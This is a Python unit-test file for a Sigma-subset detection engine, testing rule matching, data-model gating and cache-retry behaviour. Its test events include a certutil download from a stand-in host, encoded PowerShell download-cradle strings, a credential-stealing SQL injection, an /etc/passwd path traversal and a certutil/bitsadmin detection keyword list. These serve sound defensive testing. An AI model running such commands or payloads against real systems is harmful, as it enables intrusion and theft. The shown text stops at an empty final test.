# Author : Krishnendu De
# Co-Author: Claude Fable 5.0
"""Unit tests for the Sigma-subset detection engine (no database needed)."""
import logging
import re
import threading
from pathlib import Path

import pytest

from app.detection.engine import (DetectionEngine, Rule, alert_from_match,
                                   as_str_list, cim_tags, datamodels_match,
                                   flatten_event, load_rules, match_rule,
                                   reset_cim_cache)
from app.models import NormalizedEvent

RULES_DIR = Path(__file__).resolve().parent.parent / "rules"


def _rule(detection: dict, rid: str = "t", logsource=None, datamodels=None) -> Rule:
    return Rule(id=rid, title="t", level="low", description="",
                logsource=logsource or {}, detection=detection,
                datamodels=as_str_list(datamodels))


def _match(detection: dict, logsource: dict | None = None, *,
           datamodels=None, **fields) -> bool:
    """Evaluate one ad-hoc rule against one ad-hoc event.

    `datamodels` is keyword-only so it can never be mistaken for an event field, and
    is coerced with the loader's own `as_str_list` so a bare string behaves here
    exactly as `datamodels: web` does in a rule file. The event is passed to
    `match_rule` alongside its flattened view because the CIM gate reads jsonb keys
    byte-exact -- `flat` has lower-cased and dot-joined them.
    """
    fields.setdefault("vendor", "v")
    evt = NormalizedEvent(event_time=None, **fields)
    return match_rule(_rule(detection, logsource=logsource, datamodels=datamodels),
                      flatten_event(evt), evt)


@pytest.fixture
def cim_reset():
    """The engine resolves the CIM registry ONCE per process and memoizes every gate,
    so a test that breaks or swaps the registry must invalidate that on both sides."""
    reset_cim_cache()
    yield
    reset_cim_cache()


# ── value / selection matching ──────────────────────────────────────────────
def test_equals_and_contains():
    assert _match({"s": {"action": "deny"}, "condition": "s"}, action="deny")
    assert not _match({"s": {"action": "deny"}, "condition": "s"}, action="allow")
    assert _match({"s": {"message|contains": "failed"}, "condition": "s"},
                  message="Logon failed for user")


def test_value_list_is_or_and_all_modifier_is_and():
    d = {"s": {"action": ["allow", "accept"]}, "condition": "s"}
    assert _match(d, action="accept") and not _match(d, action="drop")
    allmode = {"s": {"message|contains|all": ["alpha", "beta"]}, "condition": "s"}
    assert _match(allmode, message="alpha and beta here")
    assert not _match(allmode, message="only alpha")


def test_wildcard_startswith_and_null():
    assert _match({"s": {"host_name": "FIN-*"}, "condition": "s"}, host_name="FIN-WS-014")
    assert not _match({"s": {"host_name": "FIN-*"}, "condition": "s"}, host_name="HR-1")
    assert _match({"s": {"user_name": None}, "condition": "s"})            # field absent


def test_keywords_search_all_fields():
    d = {"k": ["certutil", "bitsadmin"], "condition": "k"}
    assert _match(d, message="cmd /c certutil -urlcache -f http://x/y.exe")
    assert not _match(d, message="nothing to see")


# ── condition grammar ───────────────────────────────────────────────────────
def test_condition_and_not():
    d = {"a": {"action": "deny"}, "b": {"protocol": "tcp"}, "condition": "a and not b"}
    assert _match(d, action="deny", protocol="udp")
    assert not _match(d, action="deny", protocol="tcp")


def test_condition_one_of_and_all_of_wildcard():
    d = {"sel_x": {"action": "deny"}, "sel_y": {"action": "drop"}, "condition": "1 of sel_*"}
    assert _match(d, action="drop") and not _match(d, action="allow")
    d2 = {"sel_x": {"action": "deny"}, "sel_y": {"protocol": "tcp"}, "condition": "all of sel_*"}
    assert _match(d2, action="deny", protocol="tcp")
    assert not _match(d2, action="deny", protocol="udp")


def test_modifier_cidr():
    d = {"s": {"src_ip|cidr": ["10.0.0.0/8", "192.168.0.0/16"]}, "condition": "s"}
    assert _match(d, src_ip="10.1.2.3") and _match(d, src_ip="192.168.5.5")
    assert not _match(d, src_ip="203.0.113.9")
    assert not _match(d, src_ip="not-an-ip")


def test_modifier_numeric_comparisons():
    assert _match({"s": {"dst_port|gte": 1024}, "condition": "s"}, dst_port=3389)
    assert not _match({"s": {"dst_port|lt": 1024}, "condition": "s"}, dst_port=3389)
    assert _match({"s": {"bytes_total|gt": 1000000}, "condition": "s"}, bytes_total=5_000_000)


def test_modifier_exists_and_fieldref():
    assert _match({"s": {"user_name|exists": True}, "condition": "s"}, user_name="jdoe")
    assert _match({"s": {"host_name|exists": False}, "condition": "s"})       # absent
    assert not _match({"s": {"user_name|exists": True}, "condition": "s"})
    # fieldref: user_name equals the (raw) caller field
    d = {"s": {"user_name|fieldref": "caller"}, "condition": "s"}
    assert _match(d, user_name="svc-1", raw={"caller": "svc-1"})
    assert not _match(d, user_name="svc-1", raw={"caller": "other"})


def test_modifier_base64offset_and_windash():
    # 'IEX' embedded anywhere in a base64 blob is caught by base64offset|contains
    import base64
    blob = base64.b64encode(b"random IEX(New-Object Net.WebClient)").decode()
    assert _match({"s": {"message|base64offset|contains": "IEX"}, "condition": "s"},
                  message=blob)
    # windash: a rule written with -enc also matches the /enc form
    d = {"s": {"message|windash|contains": "-enc"}, "condition": "s"}
    assert _match(d, message="powershell -enc ABC") and _match(d, message="powershell /enc ABC")


def test_modifier_re_flags():
    # multiline + ignorecase via |re|m|i
    d = {"s": {"message|re|m|i": "^error"}, "condition": "s"}
    assert _match(d, message="line one\nERROR happened")


def test_logsource_filters_by_vendor_and_logtype():
    d = {"s": {"action": "failed-logon"}, "condition": "s"}
    ls = {"vendor": "microsoft", "log_type": "security"}
    assert _match(d, ls, vendor="microsoft", log_type="security", action="failed-logon")
    # wrong vendor -> no match even though the selection would hit
    assert not _match(d, ls, vendor="cisco", log_type="security", action="failed-logon")


# ── CIM data-model gate ─────────────────────────────────────────────────────
_DENY = {"s": {"action": "deny"}, "condition": "s"}


def test_datamodel_gate_admits_a_member():
    # log_type `traffic` is a Network member in the registry, whatever the vendor
    assert _match(_DENY, datamodels="network", log_type="traffic", action="deny")
    # a binding may be written as the display name or as the tag
    assert _match(_DENY, datamodels="Network", log_type="traffic", action="deny")
    assert _match(_DENY, datamodels=["web", "network"], log_type="traffic", action="deny")


def test_datamodel_gate_blocks_a_non_member():
    # an `access` log is Web, not Network -- the gate blocks it...
    assert not _match(_DENY, datamodels="network", log_type="access", action="deny")
    # ...and the selection itself would have matched, so the gate is what decided
    assert _match(_DENY, log_type="access", action="deny")


def test_datamodel_gate_reads_raw_keys_from_the_event_not_the_flat_view():
    """Windows Security 4624 is an Authentication member only through the jsonb key
    `event_id`, so this is the guard that `match_rule` is handed the EVENT and not
    just its flattened Sigma view (which lower-cases and dot-joins raw keys)."""
    win = dict(vendor="microsoft", product="windows", log_type="security",
               action="logon", raw={"event_id": 4624})
    d = {"s": {"action": "logon"}, "condition": "s"}
    assert _match(d, datamodels="authentication", **win)

    # the documented degradation: with no event to read, a `raw:` membership term
    # cannot resolve and the bound rule under-matches
    evt = NormalizedEvent(event_time=None, **win)
    assert not match_rule(_rule(d, datamodels="authentication"), flatten_event(evt))


def test_evaluate_event_uses_membership_the_caller_already_resolved(monkeypatch):
    """`pipeline.write_stream` resolves membership once and threads it here, so the
    registry is walked once per ingested event instead of once for this gate and again
    for `db._row`. A threaded value must be USED — if it were merely accepted and then
    recomputed, the hand-off would be dead code and the saving imaginary."""
    from app.cim import match as cim_match

    def never(evt, registry=None):
        raise AssertionError("the registry was walked despite being handed the answer")

    monkeypatch.setattr(cim_match, "tags_for", never)
    eng = DetectionEngine([_rule(_DENY, rid="bound", datamodels="network"),
                           _rule(_DENY, rid="unbound")])
    evt = NormalizedEvent(event_time=None, vendor="v", log_type="traffic", action="deny")
    fired = {r.id for r in eng.evaluate_event(evt, tags=frozenset({"network"}))}
    assert fired == {"bound", "unbound"}


def test_evaluate_event_threaded_tags_can_close_a_gate_too(monkeypatch):
    """The threaded value must decide the gate in BOTH directions — a bound rule whose
    model is absent from the supplied tags must not fire."""
    from app.cim import match as cim_match
    monkeypatch.setattr(cim_match, "tags_for", lambda *a, **k: (_ for _ in ()).throw(
        AssertionError("walked the registry")))
    eng = DetectionEngine([_rule(_DENY, rid="bound", datamodels="network"),
                           _rule(_DENY, rid="unbound")])
    evt = NormalizedEvent(event_time=None, vendor="v", log_type="traffic", action="deny")
    assert {r.id for r in eng.evaluate_event(evt, tags=frozenset({"web"}))} == {"unbound"}


def test_evaluate_event_without_tags_still_resolves_them_itself(cim_reset):
    """Omitting the argument is the original behaviour and every pre-existing caller's
    call shape — membership is resolved lazily, at most once per event."""
    eng = DetectionEngine([_rule(_DENY, rid="bound", datamodels="network"),
                           _rule(_DENY, rid="unbound")])
    evt = NormalizedEvent(event_time=None, vendor="v", log_type="traffic", action="deny")
    assert {r.id for r in eng.evaluate_event(evt)} == {"bound", "unbound"}


def test_every_match_rule_caller_hands_over_the_event():
    """`match_rule`'s docstring promises "every caller inside LogOcean passes one of
    them" — and that promise is load-bearing, not decorative: a caller that passes only
    the flat view silently under-matches any rule bound to a model with `raw:`-sourced
    membership, so a dry-run reports zero hits for a rule that fires in production.

    That is exactly what `/rules` did. This walks the AST rather than trusting the
    docstring, so the next caller cannot reintroduce it.
    """
    import ast
    import pathlib

    offenders = []
    for path in sorted(pathlib.Path("app").rglob("*.py")):
        tree = ast.parse(path.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            fn = node.func
            name = fn.attr if isinstance(fn, ast.Attribute) else getattr(fn, "id", "")
            if name != "match_rule":
                continue
            # (rule, flat) alone is the defect; (rule, flat, evt) or tags=... is fine.
            if len(node.args) < 3 and not any(k.arg in ("evt", "tags") for k in node.keywords):
                offenders.append(f"{path}:{node.lineno}")

    assert not offenders, (
        "match_rule called without the event (or its resolved tags) at: "
        + ", ".join(offenders)
        + " -- a rule bound to a raw:-sourced data model will under-match there")


def test_empty_datamodels_is_match_all():
    """Backward-compatibility guard for every rule written before the gate existed:
    unbound means match-all, even for an event that belongs to no data model."""
    unmodelled = NormalizedEvent(event_time=None, vendor="v",
                                 log_type="nothing-modelled", action="deny")
    assert cim_tags(unmodelled) == frozenset()          # genuinely in no model
    assert _match(_DENY, log_type="nothing-modelled", action="deny")
    assert datamodels_match(_rule(_DENY), frozenset())

    # and the shipped pack: every rule that declares no binding is still match-all
    rules = load_rules(RULES_DIR)
    unbound = [r for r in rules if not r.datamodels]
    assert len(rules) - len(unbound) <= 10              # only a handful are bound yet
    assert all(datamodels_match(r, frozenset()) for r in unbound)


def test_datamodel_and_logsource_are_both_required():
    """The two gates AND: `datamodels:` says what the event is, `logsource:` says
    which source produced it, and a rule declaring both means the intersection."""
    d = {"s": {"action": "get"}, "condition": "s"}
    ls = {"vendor": "web"}
    assert _match(d, ls, datamodels="web", vendor="web", log_type="access", action="get")
    # right kind of event, wrong source
    assert not _match(d, ls, datamodels="web", vendor="zeek", log_type="http", action="get")
    # right source, wrong kind of event (a `conn` record is Network, not Web)
    assert not _match(d, ls, datamodels="web", vendor="web", log_type="conn", action="get")


def test_unknown_datamodel_kills_only_its_own_rule(cim_reset, caplog):
    """A typo'd binding disables exactly one rule -- it must not fall through to
    match-all, and it must not take the other rules down with it. The gate runs per
    event, so it must also complain exactly once and not once per event."""
    eng = DetectionEngine([_rule(_DENY, rid="typo", datamodels="netwrok"),
                           _rule(_DENY, rid="bound", datamodels="network"),
                           _rule(_DENY, rid="unbound")])
    evt = NormalizedEvent(event_time=None, vendor="v", log_type="traffic", action="deny")
    with caplog.at_level(logging.ERROR, logger="logocean"):
        fired = [{r.id for r in eng.evaluate_event(evt)} for _ in range(3)]
    assert fired == [{"bound", "unbound"}] * 3
    assert sum("netwrok" in r.getMessage() for r in caplog.records) == 1


def test_cim_registry_failure_degrades_to_dead_rules(monkeypatch, cim_reset):
    """A registry that will not load costs the bound rules and nothing else -- the
    pipeline evaluates every other rule and keeps ingesting."""
    from app.cim import registry as cim_registry

    def boom():
        raise RuntimeError("models.yaml is unreadable")

    monkeypatch.setattr(cim_registry, "get_registry", boom)
    reset_cim_cache()                       # force re-resolution through the break

    evt = NormalizedEvent(event_time=None, vendor="v", log_type="traffic", action="deny")
    assert cim_tags(evt) == frozenset()     # never raises, just knows nothing
    eng = DetectionEngine([_rule(_DENY, rid="bound", datamodels="network"),
                           _rule(_DENY, rid="unbound")])
    assert {r.id for r in eng.evaluate_event(evt)} == {"unbound"}


def test_cim_evaluation_failure_is_reported_once_not_per_event(monkeypatch, cim_reset,
                                                               caplog):
    """A registry that LOADS and then blows up while evaluating is the nastier case:
    it happens per event, so it has to degrade to dead bound rules AND stay quiet
    after the first report, or one bad model floods the log with the whole stream."""
    from app.cim import match as cim_match

    def boom(evt, registry=None):
        raise RuntimeError("a membership term the evaluator cannot read")

    monkeypatch.setattr(cim_match, "tags_for", boom)
    reset_cim_cache()                       # force re-resolution through the break

    eng = DetectionEngine([_rule(_DENY, rid="bound", datamodels="network"),
                           _rule(_DENY, rid="unbound")])
    evt = NormalizedEvent(event_time=None, vendor="v", log_type="traffic", action="deny")
    with caplog.at_level(logging.ERROR, logger="logocean"):
        fired = [{r.id for r in eng.evaluate_event(evt)} for _ in range(3)]
    assert fired == [{"unbound"}] * 3
    assert sum("CIM membership evaluation failed" in r.getMessage()
               for r in caplog.records) == 1


# ── CIM resolution: concurrency + cache hygiene ─────────────────────────────
def test_a_second_thread_waits_for_the_registry_instead_of_racing_past_it(monkeypatch,
                                                                          cim_reset):
    """Two threads reaching `_cim()` at once — the second must WAIT for the resolution.

    The resolution used to publish its "already resolved" flag BEFORE doing the work,
    so a thread arriving inside the window read `(None, None)`, `_gate` turned that into
    a dead `_Gate` and cached it — and `_gate_cache` is cleared only by
    `reset_cim_cache()` (tests) or by overflow, so that rule then returned False for the
    life of the process. Silently, too: `_cim` never entered its except branch on that
    path, so nothing was logged and nothing could be noticed.

    Concurrent first callers are the normal case (INGEST_WORKERS writers, /upload,
    /api/ingest, /rules/test, the workbench), and with CIM_ENABLED=false nothing warms
    the registry at boot so the window is a whole `registry.load()` wide. Here it is
    held open with an Event so the race is reproduced on purpose rather than waited for.
    """
    from app.cim import registry as cim_registry
    from app.detection import engine

    real_get_registry = cim_registry.get_registry
    resolving = threading.Event()          # the first caller is inside the slow load
    finish = threading.Event()             # ...and may now come out of it
    racing = threading.Event()             # the second caller is about to call in

    def slow_get_registry():
        resolving.set()
        assert finish.wait(10), "the resolver was never released"
        return real_get_registry()

    monkeypatch.setattr(cim_registry, "get_registry", slow_get_registry)
    reset_cim_cache()                      # force re-resolution through the slow path

    evt = NormalizedEvent(event_time=None, vendor="v", log_type="traffic", action="deny")
    rule = _rule(_DENY, rid="bound", datamodels="network")
    seen: dict[str, bool] = {}

    def resolver():
        seen["first"] = datamodels_match(rule, cim_tags(evt))

    def racer():
        racing.set()
        seen["second"] = datamodels_match(rule, cim_tags(evt))

    first = threading.Thread(target=resolver, name="cim-resolver")
    second = threading.Thread(target=racer, name="cim-racer")
    first.start()
    assert resolving.wait(10), "the first caller never reached the registry load"
    second.start()
    assert racing.wait(10)
    # The second caller is now either parked on the resolution (correct) or already
    # through it holding `(None, None)` (the bug). `join` tells the two apart without
    # depending on timing to produce the failure: a correct engine keeps the thread
    # alive until `finish` is set, so this always waits the whole 0.25s and then the
    # asserts below pass; a broken one lets it run to completion in microseconds and
    # `join` returns at once, with a dead gate already cached.
    second.join(0.25)
    raced_past = not second.is_alive()
    finish.set()                           # release BEFORE asserting — never hang here
    first.join(10)
    second.join(10)
    assert not first.is_alive() and not second.is_alive(), "a caller never came back"

    assert seen == {"first": True, "second": True}, (
        f"a datamodel-bound rule was silently disabled by a concurrent first call: {seen}")
    assert not raced_past, (
        "the second thread got an answer while the registry was still loading - it read "
        "the resolution flag before the handles it guards were set")
    # The permanence is what made this a blocker rather than a hiccup: the dead gate is
    # memoized, so the rule stays off long after the registry finished loading.
    assert datamodels_match(rule, cim_tags(evt)), (
        "the rule is permanently dead - a dead gate from the race is still cached")
    assert engine._gate_cache[("bound", ("network",))].dead is False


def test_a_failed_resolution_is_never_memoized_as_a_gate(monkeypatch, cim_reset):
    """A `_Gate` is only ever cached when it was resolved against a REAL registry.

    `_gate_cache` outlives everything but `reset_cim_cache()` (tests only) and its own
    overflow, so caching the gate built for "there is no registry" promotes whatever
    broke the resolution — a race, a half-written models.yaml — into permanent state for
    that rule. The dead gate is still RETURNED, because a bound rule has nothing to
    match against while the registry is missing; it is simply not remembered.
    """
    from app.cim import registry as cim_registry
    from app.detection import engine

    def boom():
        raise RuntimeError("models.yaml is unreadable")

    monkeypatch.setattr(cim_registry, "get_registry", boom)
    reset_cim_cache()                       # force re-resolution through the break

    rule = _rule(_DENY, rid="bound", datamodels="network")
    assert not datamodels_match(rule, {"network"})     # off while there is no registry
    assert engine._gate_cache == {}, (
        "a gate resolved against a null registry was memoized - the outage now outlives "
        "itself and that rule can never come back without a restart")

    # and with the registry back, the same rule resolves normally
    monkeypatch.undo()
    reset_cim_cache()
    assert datamodels_match(rule, {"network"})


def test_log_once_keys_are_bounded_like_the_gate_cache(cim_reset, caplog):
    """`_log_once`'s keys embed `rule.id`, which reaches the engine straight from pasted
    YAML (`main.rules_test`, `workbench.evaluate`). That makes the key set user-driven,
    exactly like the gate cache right below it — which got an explicit cap for this
    reason while the log-key set got none, so pasting rules grew it forever.
    """
    from app.detection import engine

    fed = engine._LOG_KEYS_MAX + 50
    # every id is unique and every binding is a typo, so each pass mints one new key
    with caplog.at_level(logging.CRITICAL, logger="logocean"):   # ...and stays quiet
        for i in range(fed):
            datamodels_match(_rule(_DENY, rid=f"pasted-{i}", datamodels="netwrok"),
                             frozenset())
    assert len(engine._logged) < fed, "the once-only log keys grew with the input"
    assert len(engine._logged) <= engine._LOG_KEYS_MAX
    assert len(engine._gate_cache) <= engine._GATE_CACHE_MAX


def test_a_failed_cim_resolution_is_retried_instead_of_becoming_permanent(monkeypatch,
                                                                          cim_reset):
    """A registry that fails at first touch and would succeed on retry must not switch
    the bound rules off for the life of the process.

    The resolution used to set its "resolved" flag on the failure path too, one level up
    from the gate that was fixed for the same reason. So ONE bad moment -- a models.yaml
    caught mid-write, a `registry.reload()` that raised and left the singleton empty, a
    transient MemoryError -- disabled every datamodel-bound rule until someone restarted
    the process. Nothing in the app calls `reset_cim_cache()`, so there was no way back.

    Driven by an INJECTED clock, never by sleeping: the retry wall is a wall-clock
    interval and the test steps over it explicitly.
    """
    from app.cim import registry as cim_registry
    from app.detection import engine

    real, broken, attempts, now = cim_registry.get_registry, [True], [], [1000.0]

    def flaky():
        attempts.append(now[0])
        if broken[0]:
            raise RuntimeError("models.yaml was half-written")
        return real()

    monkeypatch.setattr(cim_registry, "get_registry", flaky)
    monkeypatch.setattr(engine, "_clock", lambda: now[0])
    reset_cim_cache()                       # force re-resolution through the break

    rule = _rule(_DENY, rid="bound", datamodels="network")
    assert not datamodels_match(rule, {"network"})     # dead while the registry is down
    broken[0] = False                                  # ...and now it would load again

    now[0] += engine._CIM_RETRY_SECONDS + 1            # one event, past the retry wall
    assert datamodels_match(rule, {"network"}), (
        "a datamodel-bound rule stayed dead after the registry recovered - the failed "
        "resolution was memoized as permanent process state")
    assert attempts == [1000.0, 1000.0 + engine._CIM_RETRY_SECONDS + 1], (
        f"expected one failed attempt and one successful retry, got {attempts}")


def test_the_cim_retry_waits_instead_of_reloading_the_registry_per_event(monkeypatch,
                                                                         cim_reset):
    """The other half of retrying: it has to stay affordable.

    `registry.load()` measures ~200 ms on the shipped 11-model models.yaml and it runs
    UNDER `_cim_lock`, so retrying on every call would turn a broken registry from "the
    bound rules are off" into "the whole detection path stalls for 200 ms per event".
    The wall bounds that at one load per `_CIM_RETRY_SECONDS` whatever the event rate --
    which is also why it is a clock and not a count of calls: a call budget is seconds of
    recovery latency at 10k events/s and hours of it on a quiet box.
    """
    from app.cim import registry as cim_registry
    from app.detection import engine

    attempts, now = [], [1000.0]

    def boom():
        attempts.append(now[0])
        raise RuntimeError("models.yaml is still unreadable")

    monkeypatch.setattr(cim_registry, "get_registry", boom)
    monkeypatch.setattr(engine, "_clock", lambda: now[0])
    reset_cim_cache()                       # force re-resolution through the break

    rule = _rule(_DENY, rid="bound", datamodels="network")
    tick = engine._CIM_RETRY_SECONDS / 1000.0          # 500 events = half the wall
    for _ in range(500):
        assert not datamodels_match(rule, {"network"})
        now[0] += tick
    assert attempts == [1000.0], (
        f"a broken registry was re-loaded {len(attempts)} times inside one retry wall")

    now[0] += engine._CIM_RETRY_SECONDS     # ...and the wall expires
    assert not datamodels_match(rule, {"network"})
    assert len(attempts) == 2, "the retry never fired once the wall expired"


def test_the_engine_and_registry_retry_walls_compose_instead_of_cancelling(monkeypatch,
                                                                           cim_reset):
    """The two negative caches are in SERIES, and this pins what that costs.

    Every other retry test here patches `cim_registry.get_registry` itself, which hops
    over the registry's own negative cache — so none of them can see the composition.
    This one breaks `registry.load` instead and goes through the real `get_registry`,
    which is the arrangement a running process actually has.

    Two properties, and they pull in opposite directions:

    * CHEAP. The engine's retry is usually answered from the registry's remembered
      failure in O(1) rather than re-parsing the 27KB YAML. So the engine's wall bounds
      attempts and the registry's bounds PARSES, and the expensive one is the inner one.
    * SLOWER TO RECOVER. This engine's wall is armed a few hundred ms before the
      registry's (`now` is sampled before the load), so the first retry past 30 s lands
      inside the registry's still-warm entry, is refused, and re-arms the engine. A
      fixed models.yaml is picked up in 30-60 s, not 30 — bounded and self-correcting,
      and documented as such on `_cim`.
    """
    from app.cim import registry as cim_registry
    from app.detection import engine

    parses, now = [], [1000.0]

    def broken_load(*a, **k):
        parses.append(now[0])
        raise RuntimeError("models.yaml is unreadable")

    monkeypatch.setattr(cim_registry, "load", broken_load)
    monkeypatch.setattr(cim_registry, "_cache", None)
    monkeypatch.setattr(cim_registry, "_failure", None)
    monkeypatch.setattr(engine, "_clock", lambda: now[0])
    reset_cim_cache()

    rule = _rule(_DENY, rid="bound", datamodels="network")
    assert not datamodels_match(rule, {"network"})
    assert len(parses) == 1

    # The engine's wall expires first. It retries, and the registry — whose own entry is
    # still warm on the REAL monotonic clock the engine's injected one cannot move —
    # replays the remembered failure without touching the file.
    now[0] += engine._CIM_RETRY_SECONDS + 1
    assert not datamodels_match(rule, {"network"})
    assert len(parses) == 1, (
        f"the engine's retry re-parsed models.yaml ({len(parses)} parses) - the "
        "registry's negative cache is meant to absorb it")

    # Drop the registry's half the way `registry.reload()` does, and the next engine
    # retry reaches the file again. This is the "reload, then reset" sequence.
    cim_registry._failure = None
    now[0] += engine._CIM_RETRY_SECONDS + 1
    assert not datamodels_match(rule, {"network"})
    assert len(parses) == 2, "with both walls dropped the retry must reach load()"


def test_reset_cim_cache_alone_cannot_clear_the_registrys_remembered_failure(monkeypatch,
                                                                             cim_reset):
    """`reset_cim_cache()` is "try again NOW" for THIS module's wall only.

    It is documented as the call you make AFTER `registry.reload()`, and this is why:
    used alone against a registry that is currently failing, the immediate re-resolution
    is answered from the registry's private negative entry, so the reset buys nothing
    but a freshly armed wall. Pinned because the docstring makes the claim.
    """
    from app.cim import registry as cim_registry
    from app.detection import engine

    parses, broken = [], [True]
    real = cim_registry.load

    def flaky_load(*a, **k):
        parses.append(1)
        if broken[0]:
            raise RuntimeError("models.yaml is unreadable")
        return real(*a, **k)

    monkeypatch.setattr(cim_registry, "load", flaky_load)
    monkeypatch.setattr(cim_registry, "_cache", None)
    monkeypatch.setattr(cim_registry, "_failure", None)
    reset_cim_cache()

    rule = _rule(_DENY, rid="bound", datamodels="network")
    assert not datamodels_match(rule, {"network"})
    broken[0] = False                       # the operator fixes the file...

    reset_cim_cache()                       # ...and resets ONLY the engine
    assert not datamodels_match(rule, {"network"}), (
        "reset_cim_cache() alone appeared to recover - if the registry's negative cache "
        "is gone, the claim on reset_cim_cache's docstring needs deleting too")
    assert len(parses) == 1, "the file was re-read without reload() dropping the entry"

    cim_registry.reload()                   # the supported sequence: reload, then reset
    reset_cim_cache()
    assert datamodels_match(rule, {"network"}), "reload + reset did not recover"


def test_a_successful_cim_resolution_is_still_resolved_exactly_once(monkeypatch,
                                                                    cim_reset):
    """Retrying FAILURE must not have made SUCCESS repeat: the handle is resolved once
    per process and reused for every event, which is the whole point of the global."""
    from app.cim import registry as cim_registry

    real, attempts = cim_registry.get_registry, []

    def counted():
        attempts.append(1)
        return real()

    monkeypatch.setattr(cim_registry, "get_registry", counted)
    reset_cim_cache()

    evt = NormalizedEvent(event_time=None, vendor="v", log_type="traffic", action="deny")
    for _ in range(50):
        assert cim_tags(evt) == frozenset({"network"})
    assert attempts == [1], f"the registry was resolved {len(attempts)} times"


def test_a_gate_resolved_before_a_reset_is_not_written_back_after_it(monkeypatch,
                                                                     cim_reset):
    """`reset_cim_cache()` cleared `_gate_cache` OUTSIDE `_cim_lock`, so a gate already
    resolved against the PRE-reset registry could land in the cache after the clear.

    That cache is dropped by nothing else but its own overflow, so the stale binding then
    outlives the registry it was resolved against for the life of the process -- the same
    permanent-state class as the two findings above it. `_cim_generation` is what lets the
    thread holding an in-flight gate notice that its registry has been discarded.

    The window is FORCED with an Event rather than waited for: the fake registry parks
    inside `by_name`, which is precisely the unlocked middle of `_gate`.
    """
    from app.cim import registry as cim_registry
    from app.detection import engine

    resolving, release = threading.Event(), threading.Event()

    class _Model:
        tag = "network"

    class _SlowRegistry:
        tags = ("network",)

        def by_name(self, name):            # noqa: ARG002 — one model, whatever is asked
            resolving.set()
            assert release.wait(10), "the gate resolution was never released"
            return _Model()

    monkeypatch.setattr(cim_registry, "get_registry", _SlowRegistry)
    reset_cim_cache()                       # force re-resolution through the fake

    rule = _rule(_DENY, rid="bound", datamodels="network")
    seen: dict[str, bool] = {}

    def resolver():
        seen["gate"] = datamodels_match(rule, {"network"})

    t = threading.Thread(target=resolver, name="cim-gate")
    t.start()
    assert resolving.wait(10), "the resolver never reached the registry"
    reset_cim_cache()                       # ...and the reset lands mid-resolution
    release.set()                           # release BEFORE asserting - never hang here
    t.join(10)
    assert not t.is_alive(), "the resolver never came back"

    assert seen["gate"] is True, "the in-flight call must still get its own answer"
    assert engine._gate_cache == {}, (
        "a gate resolved against the pre-reset registry was written back after the "
        "reset cleared the cache - that binding now outlives the registry it came from")


def test_the_cim_docstring_names_the_real_boot_time_registry_warmer(monkeypatch):
    """`_cim`'s docstring carries the performance argument for resolving under a lock:
    the registry is already warm in a served process, so the load behind the lock is a
    cache hit and the window nobody can race through is small.

    That argument is only true of the function that actually forces the load. The
    docstring named `main._init_cim`, which builds the `cim_<tag>` VIEWS, returns early
    under CIM_ENABLED=false and never touches the registry -- so the sentence holding up
    the whole construction was checkable and wrong. `main._require_cim_registry` is the
    real one: first in the lifespan, ungated, and fatal if the load raises.
    """
    from app import db, main
    from app.cim import registry as cim_registry
    from app.detection import engine

    refs = set(re.findall(r"main\.(_[A-Za-z_]+)", engine._cim.__doc__ or ""))
    assert refs, "the docstring no longer names anything in app.main"
    missing = sorted(r for r in refs if not callable(getattr(main, r, None)))
    assert not missing, f"the docstring names something app.main does not have: {missing}"
    assert "_require_cim_registry" in refs, (
        "the docstring must name the function that actually forces the boot-time "
        f"registry load; it names {sorted(refs)}")

    # ...and that function really is the warmer, rather than merely being named as one
    real, warmed = cim_registry.get_registry, []

    def counted():
        warmed.append(1)
        return real()

    monkeypatch.setattr(db, "get_registry", counted)
    main._require_cim_registry()
    assert warmed == [1], "main._require_cim_registry did not force the registry load"


def test_converted_web_rules_bind_to_the_web_data_model():
    """The four T1190 web-exploitation rules read the Web data model now, so they see
    every source the registry calls Web -- not just the two log_types they listed."""
    rules = {r.id: r for r in load_rules(RULES_DIR)}
    for rid in ("lo-web-sql-injection", "lo-web-path-traversal",
                "lo-web-command-injection", "lo-web-xss"):
        assert rules[rid].datamodels == ["web"], rid

    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    # a PAN URL-filtering record: log_type `url` is a Web member but was never in the
    # old [access, http] list, so this SQL injection used to be invisible
    assert "lo-web-sql-injection" in hits(
        vendor="paloalto", product="ngfw", log_type="url", action="alert",
        message="GET /item?id=1 union select username,password from users")
    # a FortiGate web-filter record, likewise
    assert "lo-web-path-traversal" in hits(
        vendor="fortinet", product="fortigate", log_type="webfilter", action="blocked",
        message="GET /download?f=../../../../etc/passwd")
    # the gate still holds: the same payload on a non-web event does NOT fire
    assert "lo-web-sql-injection" not in hits(
        vendor="linux", product="auditd", log_type="execve", action="process-create",
        message="psql -c 'select 1 union select 2'")


def test_converted_ot_rule_covers_the_protocols_its_old_list_missed():
    """`lo-ot-it-to-ot-write` binds to the Industrial model instead of copying five
    protocol names, so the other four in app/ot.py:OT_PROTOCOLS are covered too."""
    rules = {r.id: r for r in load_rules(RULES_DIR)}
    assert rules["lo-ot-it-to-ot-write"].datamodels == ["ics"]

    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    # BACnet was NOT in the rule's old protocol list. Addresses are the placeholder
    # lab CIDRs the rule ships with: an IT source writing into the OT zone.
    itot = dict(vendor="zeek", product="bacnet", log_type="bacnet", action="write",
                src_ip="10.10.0.9", dst_ip="10.60.1.5", raw={"ot": {"operation": "write"}})
    assert "lo-ot-it-to-ot-write" in hits(**itot)
    # a write that starts inside the OT zone is routine engineering, not a violation
    assert "lo-ot-it-to-ot-write" not in hits(**{**itot, "src_ip": "10.60.0.9"})
    # a read is not a write
    assert "lo-ot-it-to-ot-write" not in hits(
        **{**itot, "action": "read", "raw": {"ot": {"operation": "read"}}})
    # and a non-OT event with the same shape is not an OT zone violation at all
    assert "lo-ot-it-to-ot-write" not in hits(**{**itot, "log_type": "conn"})


# ── the shipped rule library ────────────────────────────────────────────────
def test_rules_load_with_mitre_tags():
    rules = load_rules(RULES_DIR)
    ids = {r.id for r in rules}
    assert {"lo-win-failed-logon", "lo-rdp-allowed", "lo-ingress-tool-transfer",
            "lo-clear-eventlog"} <= ids
    flog = next(r for r in rules if r.id == "lo-win-failed-logon")
    assert "T1110" in flog.techniques and "credential access" in flog.tactics


def test_engine_fires_expected_rules():
